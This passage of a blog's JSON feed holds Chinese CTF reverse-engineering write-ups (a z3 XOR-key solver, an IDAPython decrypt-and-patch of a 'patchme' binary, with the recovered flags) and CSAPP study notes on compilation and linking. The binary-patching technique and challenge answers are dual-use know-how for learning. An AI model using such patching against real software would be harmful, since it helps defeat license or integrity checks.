punctuation\">(</span>array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span>num<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">127</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 添加约束条件</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">if</span> s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> sat<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 检测是否有解</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    result <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> num<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 因为最后得出的是等式，先遍历 temp，把 temp 的每个依次赋给 i</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 然后找到每个 temp 对应的解，附加到空列表的后面</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'无解'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">236</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">133</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    text <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span>flag<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token triple-quoted-string string\">'''输出结果:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>[236, 72, 213, 106, 189, 86, 62, 53, 120, 199, 15, 93, 133]</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>hgame&#123;z3_1s_very_u5eful_1n_rever5e_engin3ering&#125;'''</pre></td></tr></table></figure><p>这里注意后面的异或之后才是 flag</p>\n<p>每次用 z3 解 flag 都要用约束条件 32-127 才行不然就是乱码 不知道有没有别的解决办法</p>\n<p z3_1s_very_u5eful_1n_rever5e_engin3ering>flag 为 hgame</p>\n<h4 id=\"cpp\"><a class=\"markdownIt-Anchor\" href=\"#cpp\">#</a> Cpp</h4>\n<p>cpp 虚函数相关</p>\n<p>hint 给了个 pdb 文件 用 IDA 加载符号之后看 main 函数</p>\n<p><img data-src=\"/images/image-20230203145356862.png\" alt=\"image.png\"></p>\n<p>将 v8 的类型改成 encrypt2*，后面的函数调用就会非常清晰。(上图为改后，没想到这一步的也可以动态调试着做)</p>\n<p><img data-src=\"/images/image-20230203145629222.png\" alt=\"image.png\"></p>\n<p>func7 是判断 flag 正确与否的函数 那么 func2 func6 就是关键</p>\n<p><img data-src=\"/images/image-20230203145903551.png\" alt=\"image.png\"></p>\n<p>先在函数窗口找到 func7 提取出比较数据</p>\n<p>[0x28, 0x50, 0xC1, 0x23, 0x98, 0xA1, 0x41, 0x36, 0x4C, 0x31, 0xCB, 0x52, 0x90, 0xF1, 0xAC, 0xCC, 0x0F, 0x6C, 0x2A, 0x89, 0x7F, 0xDF, 0x11, 0x84, 0x7F, 0xE6, 0xA2, 0xE0, 0x59, 0xC7, 0xC5, 0x46, 0x5D, 0x29, 0x38, 0x93, 0xED, 0x15, 0x7A, 0xFF]</p>\n<p><img data-src=\"/images/image-20230203151215551.png\" alt=\"image.png\"></p>\n<p>func2 像是某种初始化，一系列赋值</p>\n<p>func6 就是异或加密</p>\n<p><img data-src=\"/images/image-20230203185923866.png\" alt=\"image.png\"></p>\n<p>重点就是提取出异或的数据</p>\n<p><img data-src=\"/images/image-20230203191542378.png\" alt=\"image.png\"></p>\n<p>这里看看 string2int 函数</p>\n<p><img data-src=\"/images/image-20230203192122620.png\" alt=\"image.png\"></p>\n<p>这看了 WP 还没搞懂… 等大佬们的博客 ing</p>\n<h4 id=\"patchme\"><a class=\"markdownIt-Anchor\" href=\"#patchme\">#</a> patchme</h4>\n<p>IDA 打开找到 main 函数</p>\n<p><img data-src=\"/images/image-20230204013212414.png\" alt=\"image.png\"></p>\n<p>根据题目 应该是要 patch 某个地方</p>\n<p><img data-src=\"/images/image-20230204013602004.png\" alt=\"image.png\"></p>\n<p>在 main 函数附近找到了一个在 main 函数之前执行的一个自解密函数</p>\n<p>idapython 的脚本进行异或操作</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> idc</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>addr <span class=\"token operator\">=</span> <span class=\"token number\">0x14C6</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">961</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    idc<span class=\"token punctuation\">.</span>patch_byte<span class=\"token punctuation\">(</span>addr<span class=\"token operator\">+</span>i<span class=\"token punctuation\">,</span> idc<span class=\"token punctuation\">.</span>get_wide_byte<span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span>addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>然后汇编修改上面的 jnz 变 jz 下面的变 jmp 保存 patch 再异或保存文件 再运行就行了</p>\n<p>IDA-》edit-》Patch program-》Assemble 修改，然后 IDA-》edit-》Patch program-》Apply patches to input file 保存 (可选择备份但不如自己备份)</p>\n<p><img data-src=\"/images/image-20230204124943398.png\" alt=\"image.png\"></p>\n<p>loc_164A 就是输出 flag 函数</p>\n<p>执行结果:</p>\n<p><img data-src=\"/images/image-20230204130419527.png\" alt=\"image.png\"></p>\n<p you_4re_a_p@tch_master_0r_reverse_ma5ter>flag 为 hgame</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/01/07/CSAPP%E3%81%AE%E5%AD%A6%E7%BF%92%E8%A8%98%E9%8C%B2/",
            "url": "https://3cly.github.io/2023/01/07/CSAPP%E3%81%AE%E5%AD%A6%E7%BF%92%E8%A8%98%E9%8C%B2/",
            "title": "CSAPPの学習記録",
            "date_published": "2023-01-06T16:17:12.000Z",
            "content_html": "<h1 id=\"第一章-计算机系统漫游\"><a class=\"markdownIt-Anchor\" href=\"#第一章-计算机系统漫游\">#</a> 第一章 计算机系统漫游</h1>\n<h2 id=\"11信息就是位上下文\"><a class=\"markdownIt-Anchor\" href=\"#11信息就是位上下文\">#</a> 1.1 信息就是位 + 上下文</h2>\n<p>1. 文件都以字节序列方式存储，只由 ASCII 字符构成称为文本文件，其他所有文件称为二进制文件</p>\n<p>2. 区分相同位串代表的不同数据对象的唯一方法是我们读到这些数据对象时的上下文，不同上下文中，同样的字节序列可能表示一个整数浮点数字符串或者机器指令</p>\n<h2 id=\"12程序被其他程序翻译成不同的格式\"><a class=\"markdownIt-Anchor\" href=\"#12程序被其他程序翻译成不同的格式\">#</a> 1.2 程序被其他程序翻译成不同的格式</h2>\n<p>1. 把源程序文件 hello.c 翻译成可执行目标文件 hello 的过程有四个阶段（预处理，编译，汇编，链接） ，分别由预处理器，编译器，汇编器，链接器一同完成，他们共同构成了编译系统（看书上图片）<br>\n2. 预处理阶段：预处理器（cpp）根据 #开头的命令修改原始的 C 程序，并得新的 C 程序（以.i 为扩展名）<br>\n3. 编译阶段：编译器（cll）将 hello.i 翻译成文本文件 hello.s，包含一个汇编语言程序<br>\n 4. 汇编阶段：汇编器（as）把 hello.s 翻译成机器语言指令，并把这些指令打包成可重定位目标程序的格式，结果保存在 hello.o（二进制文件）<br>\n5. 链接阶段：hello 调用了 printf 函数，printf 函数存在于一个名为 printf.o 的单独的预处理好的目标文件中。有链接器（ld）把 printf.o 合并到 hello.o 当中。结果得到 hello 文件</p>\n<h2 id=\"13-了解编译系统如何工作的好处\"><a class=\"markdownIt-Anchor\" href=\"#13-了解编译系统如何工作的好处\">#</a> 1.3 了解编译系统如何工作的好处</h2>\n<ol>\n<li>优化程序性能</li>\n<li>理解链接时出现的错误</li>\n<li>避免安全漏洞</li>\n</ol>\n<h2 id=\"14-处理器读并解释存在内存中的指令\"><a class=\"markdownIt-Anchor\" href=\"#14-处理器读并解释存在内存中的指令\">#</a> 1.4 处理器读并解释存在内存中的指令</h2>\n<h3 id=\"shell\"><a class=\"markdownIt-Anchor\" href=\"#shell\">#</a> shell</h3>\n<p>hello.c 源程序已经被编译系统翻译成可执行文件 hello 并被存放在磁盘上。要想在 Unix 系统上运行该可执行文件，我们将它的文件名输入到称为 shell 的应用程序</p>\n<pre><code>linux&gt; ./hello\nhello, world\nlinux&gt;\n</code></pre>\n<p>shell 是一个命令行解释器如果命令行的第一个单词不是 shell 的内置命令，那么 shell 就会假设他是个可执行文件的名字，他将加载并执行这个文件。</p>\n<h3 id=\"硬件\"><a class=\"markdownIt-Anchor\" href=\"#硬件\">#</a> 硬件</h3>\n<p>1. 系统硬件组成：总线，I/O 设备，主存，处理器<br>\n 2. 总线：贯穿整个系统的一组电子管道，携带信息字节并负责在各个部件间传递（传递信息用的）通常总线被设计成传送定长的字节块（字 word）。字中的字节数是一个基本的系统参数（32 位 4 个，64 位 8 个）<br>\n3.I/O 设备：系统与外部世界联系通道（鼠标键盘，显示器，磁盘），I/O 通过控制器（I/O 设备本身或者主印刷电路板上的芯片组）或适配器（插在主板插槽）与总线相连<br>\n 4. 主存：临时存储设备，处理器执行程序的时候用来存放程序和数据的，有一组动态随即存取存储器（DRAM）芯片组成<br>\n 5. 处理器：中央处理器（CPU）是解释（或执行）存储在主存中指令的引擎。其和行是一个代写哦啊为一个字的存储设备（或寄存器），称为<strong>程序计数器（PC）</strong>，在任何时候 PC 都指向主存中的某条机器指令（及含有该指令的地址）。处理器从 PC 指向的内存处读指令，解释指令中的位，然后更新 PC，使其指向下一条指令，而这些指令不一定在内存中连续<br>\n。处理器操作主要围绕主存，寄存器文件，算数 / 逻辑单元进行<br>\n 6. 寄存器文件（register file）是一个小存储设备，由一些单个字长的寄存器组成，每个寄存器有唯一的文件。<br>\n7.** 算术 / 逻辑单元（ALU）** 计算数据和地址值</p>\n<p>CPU 在指令的要求下可能执行的操作如下</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">操作</th>\n<th style=\"text-align:center\">具体</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">加载</td>\n<td style=\"text-align:center\">从主存复制一个字节或字到寄存器，以覆盖寄存器原来的内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">存储</td>\n<td style=\"text-align:center\">从寄存器复制一个字节或字到主存的某个位置，覆盖主存原来的内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">操作</td>\n<td style=\"text-align:center\">把两个寄存器的内容复制到 ALU，ALU 对这两个字做算术运算，并将结果存放到一个寄存器中，以覆盖寄存器原来内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">跳转</td>\n<td style=\"text-align:center\">从指令本身抽取一个字，并将这个字复制到 PC 以覆盖 PC 原来的值</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"进程\"><a class=\"markdownIt-Anchor\" href=\"#进程\">#</a> 进程</h3>\n<p>进程可以看成是操作系统对正在运行的程序的一种抽象，在一个系统中可以运行多个进程，这些进程对外表现好像是独占硬件，实际上是通过不同进程之间进程的交互执行实现的，这个过程叫上下文切换（context switch）</p>\n<h3 id=\"线程\"><a class=\"markdownIt-Anchor\" href=\"#线程\">#</a> 线程</h3>\n<p>一个进程可以由多个线程组成，运行在一个上下文环境中，共享代码以及全局数据。因为共享数据，使得其比一般的进程更加高效（花在 context switch 的时间少）。</p>\n<h3 id=\"虚拟存储器\"><a class=\"markdownIt-Anchor\" href=\"#虚拟存储器\">#</a> 虚拟存储器</h3>\n<p>给进程提供的一个好像自己独占主存的假象，对于进程的所使用的虚拟存储器可以分成一下几个部分：</p>\n<ul>\n<li>程序代码和数据</li>\n<li>堆，可以动态扩展或者收缩，供像 malloc 和 free 这样的 C 语言中的库进行调用</li>\n<li>共享库</li>\n<li>栈，可以动态扩展或者收缩，用于编译器的函数调用</li>\n<li>内核虚拟存储器</li>\n</ul>\n<h1 id=\"第三章-程序的机器级表示\"><a class=\"markdownIt-Anchor\" href=\"#第三章-程序的机器级表示\">#</a> 第三章 程序的机器级表示</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vdXVhbi5tb2UvcG9zdC8yMDIyLzA5L2NzYXBwLTM=\">https://ouuan.moe/post/2022/09/csapp-3</span>  这个笔记博客好</p>\n<p>操作数有 3 种基本类型：</p>\n<ul>\n<li>立即数 —— 用数字文本表达式</li>\n<li>寄存器操作数 —— 使用 CPU 内已命名的寄存器</li>\n<li>内存操作数 —— 引用内存位置</li>\n</ul>\n<p>各种不同的操作数的可能性被分为三种类型。<strong>第一种类型是立即数 (immediate)</strong>，用来表示常数值。在 ATT 格式的汇编代码中，立即数的书写方式是‘<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>’后面跟一个用标准</mtext><mi>C</mi><mtext>表示法表示的整数，比如，</mtext></mrow><annotation encoding=\"application/x-tex\">’后面跟一个用标准C表示法表示的整数，比如，</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">’</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">面</span><span class=\"mord cjk_fallback\">跟</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord cjk_fallback\">标</span><span class=\"mord cjk_fallback\">准</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">示</span><span class=\"mord cjk_fallback\">法</span><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">示</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">整</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">比</span><span class=\"mord cjk_fallback\">如</span><span class=\"mord cjk_fallback\">，</span></span></span></span>-577 或 $0x1F。不同的指令允许的立即数值范围不同，汇编器会自动选择最紧凑的方式进行数值编码。<strong>第二种类型是寄存器 (register)</strong>，它表示某个寄存器的内容，16 个寄存器的低位 1 字节、2 字节、4 字节或 8 字节中的一个作为操作数，这些字节数分别对应于 8 位、16 位、32 位或 64 位。在图 3-3 中，我们用符号 r。来表示任意寄存器 a，用引用 R [r。] 来表示它的值，这是将寄存器集合看成一个数组 R，用寄存器标识符作为索引。<strong>第三类操作数是内存引用</strong>，它会根据计算出来的地址 (通常称为有效地址) 访问某个内存位置。因为将内存看成一个很大的字节数组，我们用符号 M,[Addr] 表示对存储在内存中从地址 Addr 开始的 b 个字节值的引用。为了简便，我们通常省去下标 b。</p>\n<blockquote>\n<h4 id=\"指令集的-referenceatt-格式-vs-intel-格式\"><a class=\"markdownIt-Anchor\" href=\"#指令集的-referenceatt-格式-vs-intel-格式\">#</a> 指令集的 reference:ATT 格式 vs Intel 格式</h4>\n<p>CS:APP 以及 gcc,OBJDUMP 默认使用的是 ATT 格式的汇编，其他一些编程工具，包括 Microsoft 的工具，以及来自 Intel 的文档，其汇编代码都是 Intel 格式的。这两种格式在许多方面有所不同。使用下述命令行，GCC 可以产生 multstore 函数的 Intel 格式的代码:</p>\n<p><strong>linux&gt; gcc -Og -s -masm=intel mstore.c</strong></p>\n<p>我们看到 Intel 和 ATT 格式在如下方面有所不同:</p>\n<p>Intel 代码省略了指示大小的后缀。我们看到指令 push 和 mov，而不是 pushq 和 movq。Intel 代码省略了寄存器名字前面的‘%' 符号，用的是 rbx，而不是 % rbx。</p>\n<p>Intel 代码用不同的方式来描述内存中的位置，例如是‘QWORD PTR [rbx]' 而不是‘(% rbx)’。</p>\n<p>在带有多个操作数的指令情况下，列出操作数的顺序相反。当在两种格式之间进行转换的时候，这一点非常令人困惑。虽然在我们的表述中不使用 Intel 格式，但是在来自 Intel 和 Microsoft 的文档中，你会遇到它。</p>\n</blockquote>\n<p>x86-64 寄存器</p>\n<p><img data-src=\"/images/image-20231110190711464.png\" alt=\"image-20231110190711464\"></p>\n<p><img data-src=\"/images/image-20231110191711992.png\" alt=\"image-20231110191711992\"></p>\n<p><strong>补码 / 反码、零扩展和符号位扩展:</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MDUzOTEyNS9hcnRpY2xlL2RldGFpbHMvMTAzMDU4NDIw\">https://blog.csdn.net/weixin_40539125/article/details/103058420</span></p>\n<h1 id=\"第七章-链接\"><a class=\"markdownIt-Anchor\" href=\"#第七章-链接\">#</a> 第七章 链接</h1>\n<blockquote>\n<p>链接（ Clinking）是将各种代码和数据片段收集并组合成为一个单一文件的过程，这个文件可被加载（复制）到内存并执行。链接可以执行于编译时（ compile time），也就是在源代码被翻译成机器代码时；也可以执行于加载时（ load time），也就是在程序被加载器（lad er）加载到内存并执行时；甚至执行于运行时（ run time），也就是由应用程序来执行。在早期的计算机系统中，链接是手动执行的。在现代系统中，链接是由叫做链接器（ linker）的程序自动执行的。</p>\n</blockquote>\n<p><strong>静态链接</strong></p>\n<p>像 Linux LD 程序这样的静态链接器以一组可重定位目标文件和命令行参数作为输入，生成一个完全链接的、可以加载和运行的可执行目标文件作为输出。输入的可重定位目标文件由各种不同的代码和数据节（ section）组成，每一节都是一个连续的字节序列。指令在一节中，初始化了的全局变量在另一节中，而未初始化的变量又在另外节中。</p>\n<p>为了构造可执行文件，链接器必须完成两个主要任务：</p>\n<p>符号解析（ symbol resolution）。目标文件定义和引用符号，每个符号对应于一个函数、一个全局变量或一个静态变量（即 C 语言中任何以 static 属性声明的变量）。符号解析的目的是将每个符号引用正好和一个符号定义关联起来。</p>\n<p>重定位（ relocation）。编译器和汇编器生成从地址 0 开始的代码和数据节。链接器通过把每个符号定义与一个内存位置关联起来，从而重定位这些节，然后修改所有对这些符号的引用，使得它们指向这个内存位置。链接器使用汇编器产生的重定位条目（ relocation entry）的详细指令，不加甄别地执行这样的重定位。</p>\n<h2 id=\"目标文件\"><a class=\"markdownIt-Anchor\" href=\"#目标文件\">#</a> <strong>目标文件</strong></h2>\n<p>目标文件有三种形式：<br>\n  <strong>可重定位目标文件</strong>。包含二进制代码和数据，其形式可以在编译时与其他可重定位目标文件合并起来，创建一个可执行目标文件可执行目标文件。包含二进制代码和数据，其形式可以被直接复制到内存并执行。(main.o)</p>\n<p><strong>可执行目标文件</strong>。包含二进制代码和数据，其形式可以被直接复制到内存并执行。(prog)</p>\n<p>共享目标文件。一种特殊类型的可重定位目标文件，可以在加载或者运行时被动态地加载进内存并链接。</p>\n<p>编译器和汇编器生成可重定位目标文件（包括共享目标文件）。链接器生成可执行目标文件。</p>\n<p><img data-src=\"/images/image-20230924211257369.png\" alt=\"image-20230924211257369\"></p>\n<p>​        <strong>.text</strong>：已编译程序的机器代码。</p>\n<p><strong>.rodata</strong>：只读数据，比如 printf 语句中的格式串和开关语句的跳转表。</p>\n<p><strong>.data</strong>：已初始化的全局和静态 C 变量。局部 C 变量在运行时被保存在栈中，既不出现在，data 节中，也不出现在.bss 节中</p>\n<p><strong>.bss</strong>：未初始化的全局和静态 C 变量，以及所有被初始化为 0 的全局或静态变量。在目标文件中这个节不占据实际的空间，它仅仅是一个占位符。目标文件格式区分已初始化和未初始化变量是为了空间效率：在目标文件中，未初始化变量不需要占据任何实际的磁盘空间。运行时，在内存中分配这些变量，初始值为 0。</p>\n<p><strong>.symtab</strong>：一个符号表，它存放在程序中定义和引用的函数和全局变量的信息。一些程序员错误地认为必须通过 - g 选项来编译一个程序，才能得到符号表信息。实际上，每个可重定位目标文件在. symtab 中都有一张符号表（除非程序员特意用 STRIP 命令去掉它）。然而，和编译器中的符号表不同， symtab 符号表不包含局部变量的条目。</p>\n<p><strong>.rel.text</strong>：一个.text 节中位置的列表，当链接器把这个目标文件和其他文件组合时，需要修改这些位置。一般而言，任何调用外部函数或者引用全局变量的指令都需要修改。另一方面，调用本地函数的指令则不需要修改。注意，可执行目标文件中并不需要重定位信息，因此通常省略，除非用户显式地指示链接器包含这些信息。</p>\n<p><strong>.rel.data</strong>：被模块引用或定义的所有全局变量的重定位信息。一般而言，任何已初始化的全局变量，如果它的初始值是一个全局变量地址或者外部定义函数的地址，都需要被修改。</p>\n<p><strong>.debug</strong>：一个调试符号表，其条目是程序中定义的局部变量和类型定义，程序中定义和引用的全局变量，以及原始的 C 源文件。只有以 - g 选项调用编译器驱动程序时，才会得到这张表。</p>\n<p><strong>.line</strong>：原始 C 源程序中的行号和.text 节中机器指令之间的映射。只有以 - g 选项调用编译器驱动程序时，才会得到这张表。</p>\n<p><strong>.strtab</strong>：一个字符串表，其内容包括. symtab 和， debug 节中的符号表，以及节头部中的节名字。字符串表就是以 null 结尾的字符串的序列。</p>\n<h2 id=\"符号和符号表\"><a class=\"markdownIt-Anchor\" href=\"#符号和符号表\">#</a> 符号和符号表</h2>\n<p>每个可重定位目标模块 m 都有一个符号表，它包含 m 定义和引用的符号的信息。在链接器的上下文中，有三种不同的符号：</p>\n<p>由模块 m 定义并能被其他模块引用的全局符号。全局链接器符号对应于非静态的 C 函数和全局变量。</p>\n<p>由其他模块定义并被模块 m 引用的全局符号。这些符号称为外部符号，对应于在其他模块中定义的非静态 C 函数和全局变量。</p>\n<p>只被模块 m 定义和引用的局部符号。它们对应于带 static 属性的 C 函数和全局变量。这些符号在模块 m 中任何位置都可见，但是不能被其他模块引用。<br>\n如何解析多重定义的全局符号</p>\n<p>链接器的输入是一组可重定位目标模块。每个模块定义一组符号，有些是局部的（只对定义该符号的模块可见），有些是全局的（对其他模块也可见）。如果多个模块定义同名的全局符号，会发生什么呢？下面是 Linux 编译系统采用的方法。</p>\n<p>在编译时，编译器向汇编器输出每个全局符号，或者是强（ strong）或者是弱（weak），而汇编器把这个信息隐含地编码在可重定位目标文件的符号表里。函数和已初始化的全局变量是强符号，未初始化的全局变量是弱符号。<br>\n  根据强弱符号的定义， Linux 链接器使用下面的规则来处理多重定义的符号名</p>\n<p>规则 1：不允许有多个同名的强符号。</p>\n<p>规则 2：如果有一个强符号和多个弱符号同名，那么选择强符号。</p>\n<p>规则 3：如果有多个弱符号同名，那么从这些弱符号中任意选择一个。</p>\n<h2 id=\"重定位\"><a class=\"markdownIt-Anchor\" href=\"#重定位\">#</a> 重定位</h2>\n<p>一旦链接器完成了符号解析这一步，就把代码中的每个符号引用和正好一个符号定义（即它的一个输入目标模块中的一个符号表条目）关联起来。此时，链接器就知道它的输入目标模块中的代码节和数据节的确切大小。现在就可以开始重定位步骤了，在这个步骤中，将合并输入模块，并为每个符号分配运行时地址。重定位由两步组成：</p>\n<p>重定位节和符号定义。在这一步中，链接器将所有相同类型的节合并为同一类型的新的聚合节。例如，来自所有输入模块的.data 节被全部合并成一个节，这个节成为输出的可执行目标文件的.data 节。然后，链接器将运行时内存地址赋给新的聚合节，赋给输人模块定义的每个节，以及赋给输人模块定义的每个符号。当这一步完成时，程序中的每条指令和全局变量都有唯一的运行时内存地址了。</p>\n<p>重定位节中的符号引用。在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得它们指向正确的运行时地址。要执行这一步，链接器依赖于可重定位目标模块中称为重定位条目（ relocation entry）的数据结构，我们接下来将会描述这种数据结构。<br>\n加载可执行目标文件</p>\n<p>每个 Linux 程序都有一个运行时内存映像，类似于图 7-15 中所示。在 Linux x86-64 系统中，代码段总是从地址 0x400000 处开始，后面是数据段。运行时堆在数据段之后，通过调用 malloc 库往上增长。堆后面的区域是为共享模块保留的。用户栈总是从最大的合法用户地址（ 2 48 − 1 2^<ruby>48}-1 248−1）开始，向较小内存地址增长。栈上的区域，从地址 2 48 − 1 2<rp>【</rp><rt>{48</rt><rp>】</rp></ruby>-1 248−1 开始，是为内核（ kernel）中的代码和数据保留的，所谓内核就是操作系统驻留在内存的部分。</p>\n<p>为了简洁，我们把堆、数据和代码段画得彼此相邻，并且把栈顶放在了最大的合法用户地址处。实际上，由于.data 段有对齐要求，所以代码段和数据段之间是有间隙的。同时，在分配栈、共享库和堆段运行时地址的时候，链接器还会使用地址空间布局随机化。虽然每次程序运行时这些区域的地址都会改变，它们的相对位置是不变的。</p>\n<p>当加载器运行时，它创建类似于图 7-15 所示的内存映像。在程序头部表的引导下，加载器将可执行文件的片（ chunk）复制到代码段和数据段。接下来，加载器跳转到程序的入口点，也就是 _start 函数的地址。这个函数是在系统目标文件 ctrl.o 中定义的，对所有的 C 程序都是一样的。 _start 函数调用系统启动函数 __libc_start_main，该函数定义在 libc.so 中。它初始化执行环境，调用用户层的 main 函数，处理 main 函数的返回值，并且在需要的时候把控制返回给内核。</p>\n<p><img data-src=\"/images/image-20230925210855784.png\" alt=\"image-20230925210855784\"></p>\n<p><img data-src=\"/images/image-20230925215033572.png\" alt=\"image-20230925215033572\"></p>\n<p><img data-src=\"/images/image-20230924225447543.png\" alt=\"image-20230924225447543\"></p>\n<p><img data-src=\"/images/image-20230926180947308.png\" alt=\"image-20230926180947308\"></p>\n<p><img data-src=\"/images/image-20230926180842723.png\" alt=\"image-20230926180842723\"></p>\n<p><img data-src=\"/images/image-20230926181234936.png\" alt=\"image-20230926181234936\"></p>\n<p><img data-src=\"/images/image-20230926181704967.png\" alt=\"image-20230926181704967\"></p>\n<p><img data-src=\"/images/image-20230926181844716.png\" alt=\"image-20230926181844716\"></p>\n<p>plt 和 got 表</p>\n<p>Linux 链接器支持一个很强大的技术，称为库打桩 (library interpositioning), 它允许你截获对共享库函数的调用，取而代之执行自己的代码。</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
